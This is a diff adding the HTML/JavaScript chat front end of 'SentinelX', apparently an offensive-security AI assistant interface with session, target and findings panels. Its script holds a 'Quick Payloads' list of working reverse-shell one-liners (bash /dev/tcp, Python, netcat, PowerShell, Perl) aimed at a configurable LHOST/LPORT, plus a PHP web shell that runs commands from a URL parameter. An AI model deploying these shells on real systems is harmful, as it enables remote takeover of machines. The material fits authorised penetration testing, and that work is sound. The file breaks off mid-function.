@@ -1,0 +1,1794 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SentinelX | Offensive Security Intelligence</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600;700&display=swap"
+        rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"></script>
+    <style>
+        :root {
+            --bg-dark: #0a0d12;
+            --bg-panel: #0f1318;
+            --bg-card: #151a21;
+            --bg-input: #1a2029;
+            --bg-hover: #1e2430;
+            --border: #2a3040;
+            --border-active: #3d4a60;
+            --text: #e8edf5;
+            --text-dim: #8893a8;
+            --text-muted: #5a6578;
+            --accent: #4d9fff;
+            --accent-hover: #6bb0ff;
+            --green: #34d399;
+            --red: #f87171;
+            --orange: #fbbf24;
+            --purple: #a78bfa;
+            --cyan: #22d3ee;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-dark);
+            color: var(--text);
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Layout */
+        .container {
+            display: flex;
+            height: 100vh;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            width: 280px;
+            background: var(--bg-panel);
+            border-right: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            flex-shrink: 0;
+        }
+
+        .sidebar-header {
+            padding: 20px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .sidebar-header i {
+            font-size: 28px;
+            color: var(--red);
+        }
+
+        .sidebar-header h1 {
+            font-size: 20px;
+            font-weight: 700;
+        }
+
+        .sidebar-header span {
+            background: var(--purple);
+            font-size: 10px;
+            padding: 2px 8px;
+            border-radius: 10px;
+            margin-left: auto;
+        }
+
+        /* New Chat Button */
+        .new-chat-btn {
+            margin: 16px;
+            padding: 12px;
+            background: linear-gradient(135deg, var(--accent), var(--purple));
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: all 0.2s;
+            font-family: inherit;
+        }
+
+        .new-chat-btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(77, 159, 255, 0.3);
+        }
+
+        .sidebar-section {
+            padding: 16px;
+        }
+
+        .sidebar-section-title {
+            font-size: 11px;
+            font-weight: 600;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        /* Workspace Buttons */
+        .workspace-btn {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            width: 100%;
+            padding: 10px 14px;
+            margin-bottom: 4px;
+            background: transparent;
+            border: 1px solid transparent;
+            border-radius: 8px;
+            color: var(--text-dim);
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.15s;
+            text-align: left;
+            font-family: inherit;
+        }
+
+        .workspace-btn:hover {
+            background: var(--bg-hover);
+            color: var(--text);
+        }
+
+        .workspace-btn.active {
+            background: rgba(77, 159, 255, 0.1);
+            border-color: rgba(77, 159, 255, 0.3);
+            color: var(--accent);
+        }
+
+        .workspace-btn i {
+            width: 18px;
+            text-align: center;
+        }
+
+        /* Session List */
+        .session-list {
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        .session-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 12px;
+            margin-bottom: 4px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.15s;
+        }
+
+        .session-item:hover {
+            border-color: var(--accent);
+        }
+
+        .session-item.active {
+            border-color: var(--accent);
+            background: rgba(77, 159, 255, 0.08);
+        }
+
+        .session-item-name {
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            flex: 1;
+            padding: 2px 4px;
+            border-radius: 4px;
+        }
+
+        .session-item-name:focus {
+            outline: none;
+            background: var(--bg-input);
+        }
+
+        .session-item-actions {
+            display: flex;
+            gap: 4px;
+            opacity: 0;
+        }
+
+        .session-item:hover .session-item-actions {
+            opacity: 1;
+        }
+
+        .session-item button {
+            background: none;
+            border: none;
+            color: var(--text-muted);
+            cursor: pointer;
+            padding: 4px;
+            font-size: 12px;
+        }
+
+        .session-item button:hover {
+            color: var(--red);
+        }
+
+        /* Sidebar Footer */
+        .sidebar-footer {
+            margin-top: auto;
+            padding: 16px;
+            border-top: 1px solid var(--border);
+        }
+
+        .model-select-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--text-muted);
+        }
+
+        .status-dot.online {
+            background: var(--green);
+            box-shadow: 0 0 8px var(--green);
+        }
+
+        .status-dot.offline {
+            background: var(--red);
+        }
+
+        .sidebar-footer select {
+            flex: 1;
+            padding: 10px;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: var(--text);
+            font-size: 12px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        /* Main Content */
+        .main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        /* Header */
+        .header {
+            height: 56px;
+            background: var(--bg-panel);
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 20px;
+            flex-shrink: 0;
+        }
+
+        .header-workspace {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 600;
+        }
+
+        .header-workspace i {
+            font-size: 18px;
+            color: var(--accent);
+        }
+
+        .header-actions {
+            display: flex;
+            gap: 8px;
+        }
+
+        .header-btn {
+            padding: 8px 14px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: var(--text-dim);
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.15s;
+            font-family: inherit;
+        }
+
+        .header-btn:hover {
+            background: var(--bg-hover);
+            color: var(--text);
+            border-color: var(--border-active);
+        }
+
+        .header-btn i {
+            margin-right: 6px;
+        }
+
+        /* Chat Area */
+        .chat-area {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .chat-messages {
+            flex: 1;
+            overflow-y: auto;
+            padding: 24px;
+        }
+
+        /* Welcome */
+        .welcome {
+            text-align: center;
+            padding: 60px 20px;
+        }
+
+        .welcome-icon {
+            font-size: 72px;
+            color: var(--red);
+            margin-bottom: 24px;
+        }
+
+        .welcome h2 {
+            font-size: 28px;
+            margin-bottom: 8px;
+        }
+
+        .welcome p {
+            color: var(--text-dim);
+            margin-bottom: 32px;
+        }
+
+        .welcome-features {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            flex-wrap: wrap;
+            margin-bottom: 32px;
+        }
+
+        .welcome-feature {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 16px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            font-size: 13px;
+        }
+
+        .welcome-feature i {
+            color: var(--cyan);
+        }
+
+        .shortcuts-hint {
+            color: var(--text-muted);
+            font-size: 12px;
+        }
+
+        .shortcuts-hint kbd {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+        }
+
+        /* Messages */
+        .message {
+            display: flex;
+            gap: 14px;
+            margin-bottom: 24px;
+            max-width: 900px;
+        }
+
+        .message.user {
+            flex-direction: row-reverse;
+            margin-left: auto;
+        }
+
+        .message-avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            font-size: 14px;
+        }
+
+        .message.assistant .message-avatar {
+            background: linear-gradient(135deg, var(--red), var(--purple));
+        }
+
+        .message.user .message-avatar {
+            background: var(--accent);
+        }
+
+        .message-content {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 14px 18px;
+            max-width: 80%;
+            line-height: 1.6;
+            font-size: 14px;
+        }
+
+        .message.user .message-content {
+            background: var(--accent);
+            border-color: var(--accent);
+        }
+
+        .message-content pre {
+            background: var(--bg-dark);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 14px;
+            margin: 12px 0;
+            overflow-x: auto;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            position: relative;
+        }
+
+        .message-content code {
+            font-family: 'JetBrains Mono', monospace;
+            background: var(--bg-dark);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 12px;
+        }
+
+        .message-content pre code {
+            background: none;
+            padding: 0;
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            padding: 4px 10px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            color: var(--text-muted);
+            font-size: 11px;
+            cursor: pointer;
+            opacity: 0;
+            transition: opacity 0.15s;
+        }
+
+        .message-content pre:hover .copy-btn {
+            opacity: 1;
+        }
+
+        .copy-btn:hover {
+            background: var(--accent);
+            color: white;
+        }
+
+        /* Input Area */
+        .input-area {
+            padding: 16px 24px 24px;
+            background: var(--bg-panel);
+            border-top: 1px solid var(--border);
+        }
+
+        .input-wrapper {
+            display: flex;
+            gap: 12px;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 12px 16px;
+            transition: border-color 0.15s;
+        }
+
+        .input-wrapper:focus-within {
+            border-color: var(--accent);
+        }
+
+        .input-wrapper textarea {
+            flex: 1;
+            background: none;
+            border: none;
+            color: var(--text);
+            font-size: 14px;
+            font-family: inherit;
+            resize: none;
+            max-height: 150px;
+            line-height: 1.5;
+        }
+
+        .input-wrapper textarea:focus {
+            outline: none;
+        }
+
+        .input-wrapper textarea::placeholder {
+            color: var(--text-muted);
+        }
+
+        .input-buttons {
+            display: flex;
+            gap: 8px;
+            align-items: flex-end;
+        }
+
+        .send-btn,
+        .stop-btn {
+            width: 40px;
+            height: 40px;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            cursor: pointer;
+            font-size: 16px;
+            flex-shrink: 0;
+            transition: all 0.15s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .send-btn {
+            background: var(--accent);
+        }
+
+        .send-btn:hover {
+            background: var(--accent-hover);
+        }
+
+        .send-btn:disabled {
+            background: var(--bg-hover);
+            cursor: not-allowed;
+        }
+
+        .stop-btn {
+            background: var(--red);
+            display: none;
+        }
+
+        .stop-btn:hover {
+            background: #ef4444;
+        }
+
+        .stop-btn.visible {
+            display: flex;
+        }
+
+        /* Side Panels */
+        .panel-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.2s;
+            z-index: 100;
+        }
+
+        .panel-overlay.open {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .side-panel {
+            position: fixed;
+            top: 0;
+            right: -420px;
+            width: 420px;
+            height: 100vh;
+            background: var(--bg-panel);
+            border-left: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            transition: right 0.25s ease;
+            z-index: 101;
+        }
+
+        .side-panel.open {
+            right: 0;
+        }
+
+        .panel-header {
+            padding: 20px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .panel-header h3 {
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .panel-header h3 i {
+            color: var(--cyan);
+        }
+
+        .panel-close {
+            background: none;
+            border: none;
+            color: var(--text-muted);
+            font-size: 18px;
+            cursor: pointer;
+        }
+
+        .panel-close:hover {
+            color: var(--text);
+        }
+
+        .panel-body {
+            flex: 1;
+            overflow-y: auto;
+            padding: 16px;
+        }
+
+        /* Target Panel */
+        .target-add {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .target-add input {
+            flex: 1;
+            padding: 10px 12px;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: var(--text);
+            font-size: 13px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .target-add button {
+            padding: 10px 16px;
+            background: var(--green);
+            border: none;
+            border-radius: 6px;
+            color: black;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .target-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            margin-bottom: 8px;
+        }
+
+        .target-item span {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+        }
+
+        .target-item button {
+            background: none;
+            border: none;
+            color: var(--text-muted);
+            cursor: pointer;
+        }
+
+        .target-item button:hover {
+            color: var(--red);
+        }
+
+        /* Quick Payloads */
+        .quick-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+
+        .quick-card {
+            padding: 14px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.15s;
+        }
+
+        .quick-card:hover {
+            border-color: var(--accent);
+            transform: translateY(-2px);
+        }
+
+        .quick-card h4 {
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .quick-card h4 i {
+            color: var(--orange);
+        }
+
+        .quick-card code {
+            font-size: 10px;
+            color: var(--text-muted);
+            display: block;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .lhost-config {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+            flex-wrap: wrap;
+            padding: 14px;
+            background: var(--bg-card);
+            border-radius: 8px;
+        }
+
+        .lhost-config label {
+            font-size: 12px;
+            color: var(--text-dim);
+        }
+
+        .lhost-config input {
+            width: 100px;
+            padding: 8px;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            color: var(--text);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+        }
+
+        /* Findings */
+        .finding-add {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .finding-add select {
+            padding: 10px;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: var(--text);
+            font-size: 12px;
+        }
+
+        .finding-add input {
+            flex: 1;
+            padding: 10px 12px;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: var(--text);
+            font-size: 13px;
+        }
+
+        .finding-add button {
+            padding: 10px 16px;
+            background: var(--orange);
+            border: none;
+            border-radius: 6px;
+            color: black;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .finding-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            margin-bottom: 8px;
+        }
+
+        .finding-item .severity {
+            font-size: 10px;
+            font-weight: 600;
+            padding: 2px 8px;
+            border-radius: 4px;
+            text-transform: uppercase;
+            margin-right: 8px;
+        }
+
+        .finding-item .severity.critical {
+            background: #dc2626;
+            color: white;
+        }
+
+        .finding-item .severity.high {
+            background: #ea580c;
+            color: white;
+        }
+
+        .finding-item .severity.medium {
+            background: #d97706;
+            color: black;
+        }
+
+        .finding-item .severity.low {
+            background: #2563eb;
+            color: white;
+        }
+
+        .finding-item .severity.info {
+            background: #6b7280;
+            color: white;
+        }
+
+        .finding-item .title {
+            flex: 1;
+            font-size: 13px;
+        }
+
+        .finding-item button {
+            background: none;
+            border: none;
+            color: var(--text-muted);
+            cursor: pointer;
+        }
+
+        .finding-item button:hover {
+            color: var(--red);
+        }
+
+        .panel-hint {
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-top: 16px;
+            font-style: italic;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--border);
+            border-radius: 3px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--border-active);
+        }
+
+        /* Empty state */
+        .empty-state {
+            text-align: center;
+            color: var(--text-muted);
+            padding: 20px;
+            font-size: 13px;
+        }
+
+        /* Typing indicator */
+        .typing {
+            display: flex;
+            gap: 4px;
+            padding: 8px 0;
+        }
+
+        .typing span {
+            width: 8px;
+            height: 8px;
+            background: var(--accent);
+            border-radius: 50%;
+            animation: bounce 1.4s infinite ease-in-out;
+        }
+
+        .typing span:nth-child(1) {
+            animation-delay: -0.32s;
+        }
+
+        .typing span:nth-child(2) {
+            animation-delay: -0.16s;
+        }
+
+        @keyframes bounce {
+
+            0%,
+            80%,
+            100% {
+                transform: scale(0);
+            }
+
+            40% {
+                transform: scale(1);
+            }
+        }
+
+        /* Toast notifications */
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            padding: 12px 20px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: var(--text);
+            font-size: 13px;
+            z-index: 1000;
+            animation: slideIn 0.3s ease;
+        }
+
+        .toast.success {
+            border-color: var(--green);
+        }
+
+        .toast.error {
+            border-color: var(--red);
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateY(20px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <!-- Sidebar -->
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <i class="fas fa-shield-virus"></i>
+                <h1>SentinelX</h1>
+                <span>v4</span>
+            </div>
+
+            <button class="new-chat-btn" id="new-chat-btn">
+                <i class="fas fa-plus"></i> New Chat
+            </button>
+
+            <div class="sidebar-section">
+                <div class="sidebar-section-title">Sessions</div>
+                <div class="session-list" id="session-list">
+                    <div class="empty-state">No sessions yet</div>
+                </div>
+            </div>
+
+            <div class="sidebar-footer">
+                <div class="model-select-wrapper">
+                    <div class="status-dot" id="status-dot"></div>
+                    <select id="model-select">
+                        <option value="sentinelx">sentinelx</option>
+                    </select>
+                </div>
+            </div>
+        </aside>
+
+        <!-- Main -->
+        <main class="main">
+            <header class="header">
+                <div class="header-workspace" id="header-workspace">
+                    <i class="fas fa-shield-virus"></i>
+                    <span>SentinelX Chat</span>
+                </div>
+                <div class="header-actions">
+                    <button class="header-btn" id="export-btn" title="Export conversation">
+                        <i class="fas fa-download"></i>Export
+                    </button>
+                    <button class="header-btn" id="clear-btn" title="Clear chat">
+                        <i class="fas fa-eraser"></i>Clear
+                    </button>
+                    <button class="header-btn" id="targets-btn">
+                        <i class="fas fa-crosshairs"></i>Targets
+                    </button>
+                    <button class="header-btn" id="findings-btn">
+                        <i class="fas fa-flag"></i>Findings
+                    </button>
+                    <button class="header-btn" id="quick-btn">
+                        <i class="fas fa-bolt"></i>Quick
+                    </button>
+                </div>
+            </header>
+
+            <div class="chat-area">
+                <div class="chat-messages" id="chat-messages">
+                    <div class="welcome">
+                        <div class="welcome-icon"><i class="fas fa-shield-virus"></i></div>
+                        <h2>SentinelX</h2>
+                        <p>Professional Penetration Testing AI Assistant</p>
+                        <p style="font-size: 12px; color: var(--text-dim); margin-top: 8px;">
+                            10+ years expertise in Web AppSec, Bug Bounty, Exploit Development & Network Pentesting
+                        </p>
+                        <div class="welcome-features">
+                            <div class="welcome-feature"><i class="fas fa-search"></i> Recon</div>
+                            <div class="welcome-feature"><i class="fas fa-bug"></i> Exploits</div>
+                            <div class="welcome-feature"><i class="fas fa-file-code"></i> Payloads</div>
+                            <div class="welcome-feature"><i class="fas fa-unlock-alt"></i> Post-Ex</div>
+                        </div>
+                        <div class="shortcuts-hint">
+                            <kbd>Enter</kbd> to send · <kbd>Shift+Enter</kbd> new line · <kbd>Esc</kbd> to stop
+                        </div>
+                        <p style="font-size: 11px; color: var(--text-muted); margin-top: 16px;">
+                            Created by <a href="https://github.com/cypher-21"
+                                style="color: var(--accent);">Parosh-sec</a>
+                        </p>
+                    </div>
+                </div>
+
+                <div class="input-area">
+                    <div class="input-wrapper">
+                        <textarea id="chat-input" placeholder="Ask about exploits, payloads, techniques..."
+                            rows="1"></textarea>
+                        <div class="input-buttons">
+                            <button class="stop-btn" id="stop-btn" title="Stop generating (Esc)">
+                                <i class="fas fa-stop"></i>
+                            </button>
+                            <button class="send-btn" id="send-btn" title="Send message">
+                                <i class="fas fa-paper-plane"></i>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Overlay -->
+    <div class="panel-overlay" id="panel-overlay"></div>
+
+    <!-- Targets Panel -->
+    <aside class="side-panel" id="targets-panel">
+        <div class="panel-header">
+            <h3><i class="fas fa-crosshairs"></i> Targets</h3>
+            <button class="panel-close"><i class="fas fa-times"></i></button>
+        </div>
+        <div class="panel-body">
+            <div class="target-add">
+                <input type="text" id="target-input" placeholder="IP or domain">
+                <button id="add-target-btn"><i class="fas fa-plus"></i></button>
+            </div>
+            <div id="target-list"></div>
+        </div>
+    </aside>
+
+    <!-- Quick Payloads Panel -->
+    <aside class="side-panel" id="quick-panel">
+        <div class="panel-header">
+            <h3><i class="fas fa-bolt"></i> Quick Payloads</h3>
+            <button class="panel-close"><i class="fas fa-times"></i></button>
+        </div>
+        <div class="panel-body">
+            <div class="quick-grid" id="quick-grid"></div>
+            <div class="lhost-config">
+                <label>LHOST:</label>
+                <input type="text" id="lhost" placeholder="10.10.14.1">
+                <label>LPORT:</label>
+                <input type="text" id="lport" placeholder="4444">
+            </div>
+        </div>
+    </aside>
+
+    <!-- Findings Panel -->
+    <aside class="side-panel" id="findings-panel">
+        <div class="panel-header">
+            <h3><i class="fas fa-flag"></i> Findings</h3>
+            <button class="panel-close"><i class="fas fa-times"></i></button>
+        </div>
+        <div class="panel-body">
+            <div class="finding-add">
+                <select id="finding-severity">
+                    <option value="info">Info</option>
+                    <option value="low">Low</option>
+                    <option value="medium">Medium</option>
+                    <option value="high">High</option>
+                    <option value="critical">Critical</option>
+                </select>
+                <input type="text" id="finding-title" placeholder="Finding title...">
+                <button id="add-finding-btn"><i class="fas fa-plus"></i></button>
+            </div>
+            <div id="findings-list"></div>
+            <p class="panel-hint">Findings are injected as context to the AI.</p>
+        </div>
+    </aside>
+
+    <script>
+        // === State ===
+        let currentSession = null;
+        let messages = [];
+        let isStreaming = false;
+        let currentRequestId = null;
+        let abortController = null;
+
+        // === Quick Payloads ===
+        const QUICK_PAYLOADS = [
+            { name: 'Bash Reverse', code: 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1', lang: 'bash' },
+            { name: 'Python Reverse', code: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", lang: 'python' },
+            { name: 'Netcat Reverse', code: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f', lang: 'bash' },
+            { name: 'PowerShell', code: '$c=New-Object Net.Sockets.TCPClient("LHOST",LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write([text.encoding]::ASCII.GetBytes($r),0,$r.Length)};$c.Close()', lang: 'powershell' },
+            { name: 'PHP Web Shell', code: '<?php if(isset($_GET["c"])){echo "<pre>".shell_exec($_GET["c"])."</pre>";} ?>', lang: 'php' },
+            { name: 'Perl Reverse', code: 'perl -e \'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");\'', lang: 'perl' }
+        ];
+
+        // === DOM Elements ===
+        const chatMessages = document.getElementById('chat-messages');
+        const chatInput = document.getElementById('chat-input');
+        const sendBtn = document.getElementById('send-btn');
+        const stopBtn = document.getElementById('stop-btn');
+        const sessionList = document.getElementById('session-list');
+        const headerWorkspace = document.getElementById('header-workspace');
+        const modelSelect = document.getElementById('model-select');
+        const statusDot = document.getElementById('status-dot');
+        const overlay = document.getElementById('panel-overlay');
+        const targetsPanel = document.getElementById('targets-panel');
+        const quickPanel = document.getElementById('quick-panel');
+        const findingsPanel = document.getElementById('findings-panel');
+        const targetList = document.getElementById('target-list');
+        const quickGrid = document.getElementById('quick-grid');
+        const findingsList = document.getElementById('findings-list');
+
+        // === Initialize ===
+        document.addEventListener('DOMContentLoaded', () => {
+            checkHealth();
+            loadModels();
+            loadSessions();
+            loadTargets();
+            renderQuickPayloads();
+            attachListeners();
+
+            // Health check every 30 seconds
+            setInterval(checkHealth, 30000);
+        });
+
+        function attachListeners() {
+            // New chat button
+            document.getElementById('new-chat-btn').addEventListener('click', newChat);
+
+            // Send message
+            sendBtn.addEventListener('click', sendMessage);
+            chatInput.addEventListener('keydown', e => {
+                if (e.key === 'Enter' && !e.shiftKey) {
+                    e.preventDefault();
+                    sendMessage();
+                }
+            });
+
+            // Stop button
+            stopBtn.addEventListener('click', stopGeneration);
+
+            // Global escape key to stop
+            document.addEventListener('keydown', e => {
+                if (e.key === 'Escape' && isStreaming) {
+                    stopGeneration();
+                }
+            });
+
+            // Auto-resize
+            chatInput.addEventListener('input', () => {
+                chatInput.style.height = 'auto';
+                chatInput.style.height = Math.min(chatInput.scrollHeight, 150) + 'px';
+            });
+
+            // Export and Clear
+            document.getElementById('export-btn').addEventListener('click', exportChat);
+            document.getElementById('clear-btn').addEventListener('click', clearChat);
+
+            // Panels
+            document.getElementById('targets-btn').addEventListener('click', () => openPanel(targetsPanel));
+            document.getElementById('quick-btn').addEventListener('click', () => openPanel(quickPanel));
+            document.getElementById('findings-btn').addEventListener('click', () => { loadFindings(); openPanel(findingsPanel); });
+            overlay.addEventListener('click', closeAllPanels);
+            document.querySelectorAll('.panel-close').forEach(btn => {
+                btn.addEventListener('click', closeAllPanels);
+            });
+
+            // Add target
+            document.getElementById('add-target-btn').addEventListener('click', addTarget);
+            document.getElementById('target-input').addEventListener('keydown', e => {
+                if (e.key === 'Enter') addTarget();
+            });
+
+            // Add finding
+            document.getElementById('add-finding-btn').addEventListener('click', addFinding);
+            document.getElementById('finding-title').addEventListener('keydown', e => {
+                if (e.key === 'Enter') addFinding();
+            });
+        }
+
+        // === Health Check ===
+        async function checkHealth() {
+            try {
+                const res = await fetch('/api/health');
+                const data = await res.json();
+                statusDot.classList.toggle('online', data.ollama && data.model_ready);
+                statusDot.classList.toggle('offline', !data.ollama);
+                statusDot.title = data.ollama ? (data.model_ready ? 'Connected' : 'No model') : 'Offline';
+            } catch (e) {
+                statusDot.classList.remove('online');
+                statusDot.classList.add('offline');
+                statusDot.title = 'Connection error';
+            }
+        }
+
+        // === New Chat ===
+        function newChat() {
+            currentSession = null;
+            messages = [];
+            showWelcome();
+
+            // Deselect all sessions
+            document.querySelectorAll('.session-item').forEach(s => s.classList.remove('active'));
+        }
+
+        // === Sessions ===
+        async function loadSessions() {
+            try {
+                const res = await fetch('/api/sessions');
+                const data = await res.json();
+                renderSessions(data.sessions);
+            } catch (e) {
+                console.error('Failed to load sessions:', e);
+            }
+        }
+
+        function renderSessions(sessions) {
+            if (!sessions || sessions.length === 0) {
+                sessionList.innerHTML = '<div class="empty-state">No sessions yet</div>';
+                return;
+            }
+
+            sessionList.innerHTML = sessions.map(s => `
+                <div class="session-item ${currentSession === s.id ? 'active' : ''}" data-id="${s.id}">
+                    <span class="session-item-name" contenteditable="false">${escapeHtml(s.name || 'Session ' + s.id.slice(0, 6))}</span>
+                    <div class="session-item-actions">
+                        <button data-edit="${s.id}" title="Rename"><i class="fas fa-pen"></i></button>
+                        <button data-delete="${s.id}" title="Delete"><i class="fas fa-trash"></i></button>
+                    </div>
+                </div>
+            `).join('');
+
+            // Attach listeners
+            sessionList.querySelectorAll('.session-item').forEach(item => {
+                item.addEventListener('click', e => {
+                    if (!e.target.closest('button') && !e.target.isContentEditable) {
+                        selectSession(item.dataset.id);
+                    }
+                });
+            });
+
+            sessionList.querySelectorAll('button[data-edit]').forEach(btn => {
+                btn.addEventListener('click', e => {
+                    e.stopPropagation();
+                    const item = btn.closest('.session-item');
+                    const nameEl = item.querySelector('.session-item-name');
+                    nameEl.contentEditable = 'true';
+                    nameEl.focus();
+
+                    // Select all text
+                    const range = document.createRange();
+                    range.selectNodeContents(nameEl);
+                    const sel = window.getSelection();
+                    sel.removeAllRanges();
+                    sel.addRange(range);
+
+                    const saveRename = async () => {
+                        nameEl.contentEditable = 'false';
+                        const newName = nameEl.textContent.trim();
+                        if (newName) {
+                            await fetch(`/api/sessions/${item.dataset.id}`, {
+                                method: 'PATCH',
